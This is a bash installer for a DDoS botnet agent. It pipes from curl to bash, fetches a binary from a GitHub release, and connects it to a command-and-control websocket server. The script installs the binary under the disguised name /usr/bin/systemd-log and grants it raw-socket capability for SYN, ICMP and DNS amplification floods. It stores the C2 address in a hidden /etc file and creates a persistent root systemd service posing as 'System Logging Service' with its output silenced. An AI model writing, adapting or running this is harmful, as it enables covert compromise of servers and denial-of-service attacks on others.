#!/bin/bash
# ============================================================
# BOT DEPLOYER — Install bot on Linux VPS (public repo, no token)
# ============================================================
# Usage:
#   curl -sL https://raw.githubusercontent.com/duaakcon10/dc-ansta/main/install.sh | bash -s wss://host/ws/bot/
#   or: bash install.sh wss://host/ws/bot/
# ============================================================
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info()  { echo "[*] $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[x]${NC} $1"; }

C2_URL="${1:-wss://bot.minhvuong.io.vn/ws/bot/}"
GITHUB_REPO="duaakcon10/dc-ansta"
BOT_PATH="/usr/bin/systemd-log"
C2_CFG="/etc/.bot_c2"
SERVICE_NAME="systemd-log"

# ── root check ───────────────────────────────────
if [ "$(id -u)" -ne 0 ]; then
    err "Must run as root. Try: sudo bash install.sh ..."
    exit 1
fi

# ── normalize URL ─────────────────────────────────
case "$C2_URL" in
    wss://*|ws://*) ;;
    *) C2_URL="wss://${C2_URL}" ;;
esac
if [[ "$C2_URL" != *"/ws/"* ]]; then
    C2_URL="${C2_URL%/}/ws/bot/"
fi

info "C2 URL  : $C2_URL"
info "Repo    : github.com/$GITHUB_REPO"
info "Binary  : $BOT_PATH"

# ── deps check ────────────────────────────────────
for cmd in curl systemctl; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        err "Missing dependency: $cmd"
        exit 1
    fi
done

# ── find latest release ───────────────────────────
info "Fetching latest release..."
LATEST=""
for endpoint in "releases/latest" "releases?per_page=1" "tags?per_page=1"; do
    LATEST=$(curl -fs "https://api.github.com/repos/$GITHUB_REPO/$endpoint" 2>/dev/null \
             | grep -o '"\(tag_name\|name\)": *"[^"]*"' | head -1 | cut -d'"' -f4) || true
    [ -n "$LATEST" ] && break
done

if [ -z "$LATEST" ]; then
    err "No release found on GitHub."
    echo ""
    echo "  Check:"
    echo "    1) Push a tag:  git tag v4.0.1 && git push origin v4.0.1"
    echo "    2) Wait for Actions to finish (2-3 min)"
    echo "    3) Or download manually:"
    echo "       curl -sL https://github.com/$GITHUB_REPO/releases/download/v4.0.1/bot_static -o $BOT_PATH"
    exit 1
fi

ok "Release: $LATEST"

# ── download ──────────────────────────────────────
DL_URL="https://github.com/$GITHUB_REPO/releases/download/$LATEST/bot_static"
info "Downloading: $DL_URL"
TMP_BIN="/tmp/bot_update_$$"
if ! curl -fL "$DL_URL" -o "$TMP_BIN" 2>/dev/null; then
    err "Download failed."
    # Maybe bot_static missing, try plain "bot"
    DL_URL2="https://github.com/$GITHUB_REPO/releases/download/$LATEST/bot"
    info "Trying: $DL_URL2"
    if ! curl -fL "$DL_URL2" -o "$TMP_BIN" 2>/dev/null; then
        err "Both bot_static and bot failed to download."
        echo "  Release $LATEST may have no binary assets."
        echo "  Check: https://github.com/$GITHUB_REPO/releases/tag/$LATEST"
        rm -f "$TMP_BIN"
        exit 1
    fi
fi

# ── verify binary ────────────────────────────────
if [ ! -s "$TMP_BIN" ]; then
    err "Downloaded file is empty."
    rm -f "$TMP_BIN"
    exit 1
fi
# Magic: ELF header 7f 45 4c 46
MAGIC=$(head -c 4 "$TMP_BIN" | od -An -tx1 2>/dev/null | tr -d ' \n')
if [ "$MAGIC" != "7f454c46" ]; then
    err "Downloaded file is not a valid ELF binary (magic=$MAGIC)."
    rm -f "$TMP_BIN"
    exit 1
fi
ok "Binary OK ($(du -h "$TMP_BIN" | cut -f1))"

# ── stop old ──────────────────────────────────────
info "Stopping old instance..."
systemctl stop "$SERVICE_NAME.service" 2>/dev/null || true
killall "$SERVICE_NAME" 2>/dev/null || true
sleep 1

# ── install ───────────────────────────────────────
info "Installing to $BOT_PATH..."
mv "$TMP_BIN" "$BOT_PATH"
chmod +x "$BOT_PATH"

if setcap cap_net_raw+ep "$BOT_PATH" 2>/dev/null; then
    ok "CAP_NET_RAW set (SYN/ICMP/DNS enabled)"
else
    warn "setcap failed — SYN/ICMP/DNS_AMP won't work (need libcap2: apt-get install libcap2-bin)"
fi

# ── persist C2 URL ────────────────────────────────
echo "$C2_URL" > "$C2_CFG"
chmod 600 "$C2_CFG" 2>/dev/null || true

# ── systemd unit ─────────────────────────────────
cat > "/etc/systemd/system/${SERVICE_NAME}.service" << SERVICE
[Unit]
Description=System Logging Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${BOT_PATH} ${C2_URL}
Restart=always
RestartSec=10
User=root
WorkingDirectory=/
StandardOutput=null
StandardError=null
LimitNOFILE=1048576

[Install]
WantedBy=multi-user.target
SERVICE

systemctl daemon-reload
systemctl enable "$SERVICE_NAME.service"
systemctl restart "$SERVICE_NAME.service"
sleep 2

# ── verify ──────────────────────────────────────
echo ""
echo "============================================"
if systemctl is-active --quiet "$SERVICE_NAME.service"; then
    ok "Bot service is ACTIVE"
else
    warn "Service not active yet. Check:"
    echo "  systemctl status $SERVICE_NAME"
    echo "  journalctl -u $SERVICE_NAME -f"
    echo ""
    echo "  Debug foreground:"
    echo "    systemctl stop $SERVICE_NAME"
    echo "    BOT_FOREGROUND=1 $BOT_PATH $C2_URL --foreground"
fi
echo ""
echo "  C2      : $C2_URL"
echo "  Binary  : $BOT_PATH"
echo "  Status  : systemctl status $SERVICE_NAME"
echo "  Logs    : journalctl -u $SERVICE_NAME -f"
echo "  Debug   : BOT_FOREGROUND=1 $BOT_PATH $C2_URL --foreground"
echo "============================================"
